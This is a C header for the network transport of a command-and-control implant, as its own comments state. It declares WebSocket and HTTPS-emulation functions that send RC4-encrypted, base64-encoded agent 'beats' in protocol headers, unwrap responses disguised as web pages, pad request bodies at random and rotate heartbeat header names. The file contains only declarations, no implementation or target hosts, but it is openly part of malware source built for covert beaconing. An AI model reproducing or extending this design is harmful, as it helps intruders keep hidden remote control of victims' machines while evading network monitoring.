#ifndef WS_CONNECTOR_H
#define WS_CONNECTOR_H

#include <stdint.h>
#include <stddef.h>

/// WebSocket connector for C2 communication
/// Protocol: WebSocket binary frames over HTTP upgrade
/// Matches beacon_listener_ws (Go/Gorilla WebSocket server)
///
/// The WS server wraps all responses in WebPageOutput template:
///   response = template with <<<PAYLOAD_DATA>>> replaced by b64(encrypted data)
/// The agent strips the template wrapper using ans_pre_size/ans_size.

/// WS frame opcodes
#define WS_OPCODE_CONTINUATION  0x0
#define WS_OPCODE_TEXT          0x1
#define WS_OPCODE_BINARY        0x2
#define WS_OPCODE_CLOSE         0x8
#define WS_OPCODE_PING          0x9
#define WS_OPCODE_PONG          0xA

/// WS connection state
typedef enum {
    WS_STATE_DISCONNECTED = 0,
    WS_STATE_CONNECTING,
    WS_STATE_CONNECTED
} ws_state_t;

typedef struct {
    int fd;             ///< TCP socket fd
    ws_state_t state;   ///< Connection state
    char* host;         ///< Currently connected host (for Host header)
    uint16_t port;      ///< Currently connected port
    int use_ssl;        ///< Whether TLS was requested
    int tls_active;     ///< TLS handshake completed (mbedtls embedded)
    void* tls;          ///< ws_tls_t* (mbedtls ssl/config/entropy/rng blob), opaque here
} ws_connector_t;

/// Initialize WS connector
void ws_init(ws_connector_t* ws);

/// Connect to WebSocket server at host:port with given URI, User-Agent, and Sec-WebSocket-Protocol beat
/// Returns 0 on success, -1 on failure
int ws_connect(ws_connector_t* ws, const char* host, uint16_t port,
               const char* uri, const char* user_agent,
               const char* sec_ws_protocol, int use_ssl);

/// Send data as a WebSocket binary frame (masked, per RFC 6455)
/// Returns 0 on success, -1 on failure
int ws_send_text(ws_connector_t* ws, const uint8_t* data, size_t len);

/// Receive a WebSocket message (text or binary)
/// Allocates *out_data, sets *out_len. Caller must ax_free(*out_data).
/// Returns 0 on success, -1 on failure/close
int ws_recv_message(ws_connector_t* ws, uint8_t** out_data, size_t* out_len);

/// Receive with timeout (poll then recv)
/// Returns: 0 = message received, 1 = timeout (no data), -1 = error
int ws_recv_message_timeout(ws_connector_t* ws, uint8_t** out_data, size_t* out_len, int timeout_ms);

/// Poll for readability
int ws_poll_read(ws_connector_t* ws, int timeout_ms);

/// Disconnect WebSocket
void ws_disconnect(ws_connector_t* ws);

/// Base64 decode. Returns decoded length or -1 on error.
int ws_b64_decode(const char* in, size_t in_len, uint8_t* out, size_t out_cap);

/// Build a WS beat for Sec-WebSocket-Protocol header.
/// RC4-encrypts [agentType 4B][agentId 4B][sessionInfo] with profile enc_key,
/// then base64-encodes. Matches server parseBeat().
/// beat_buf receives the b64 string. beat_cap must be ≥ ((raw_len+2)/3)*4 + 1.
/// Returns 0 on success, -1 on failure.
int ws_build_beat(const uint8_t* enc_key, uint32_t agent_type, uint32_t agent_id,
                  const uint8_t* session_info, size_t si_len,
                  uint8_t* beat_buf, size_t beat_cap, size_t* beat_out_len);

// ── HTTPS-emulation transport (H1 Phase 1b, https_emu.c) ──
// TCP connect (+ embedded TLS when use_ssl). Reuses ws_connector_t plumbing.
int https_connect(ws_connector_t* ws, const char* host, uint16_t port, int use_ssl);

// POST a payload: body = b64(data) + random '\n' padding, beat in hb_header.
// Returns 0 on success, -1 on failure.
int https_send(ws_connector_t* ws, const char* uri, const char* user_agent,
               const char* hb_header_name, const char* beat,
               const uint8_t* data, size_t len);

// Read an HTTP response body (headers then Content-Length bytes).
// Allocates *out_data (caller frees). Returns 0 on success, -1 on failure.
int https_recv(ws_connector_t* ws, uint8_t** out_data, size_t* out_len);

// Rotate across a comma-separated heartbeat-header list (static buffer).
const char* https_pick_header(const char* list, uint32_t idx);

#endif /* WS_CONNECTOR_H */
